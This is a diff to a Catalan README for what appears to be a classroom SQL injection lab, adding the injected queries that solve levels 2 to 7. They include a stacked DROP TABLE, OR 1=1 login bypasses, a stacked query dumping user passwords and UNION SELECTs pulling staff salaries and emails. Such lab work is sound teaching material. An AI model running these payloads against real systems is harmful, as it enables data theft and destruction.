@@ -60,7 +60,38 @@ Mesures i tecniques per prevencio:
      ```
   2. level 2:
      ```
-
+     SELECT username 
+     FROM users 
+     WHERE username =''; drop table users;' AND password ='d41d8cd98f00b204e9800998ecf8427e';
+     ```
+  3. level 3:
+     ```
+     SELECT username 
+     FROM users 
+     WHERE username ='' or 1=1; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';
+     ```
+  4. level 4:
+     ```
+     SELECT username 
+     FROM users 
+     WHERE username ='' OR 1=1 ORDER BY username LIMIT 1 --' AND password ='d41d8cd98f00b204e9800998ecf8427e';
+     ```
+  5. level 5:
+     ```
+     SELECT product_id, brand, size, price 
+     FROM shoes 
+     WHERE brand=''; select user_id,username,password,email from users; -';
+  6. level 6:
+     ```
+     SELECT username 
+     FROM users 
+     WHERE username ='' UNION SELECT s.salary AS staff_salary FROM staff s WHERE s.firstname = 'Greta Maria' -- ' AND password ='d41d8cd98f00b204e9800998ecf8427e';
+     ```
+  7. level 7:
+     ```
+     SELECT product_id, brand, size, price 
+     FROM shoes 
+     WHERE brand='' UNION SELECT name, firstname, email, salary, employed_since FROM staff --';
      ```
 
 [![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/S9WTUTwx)
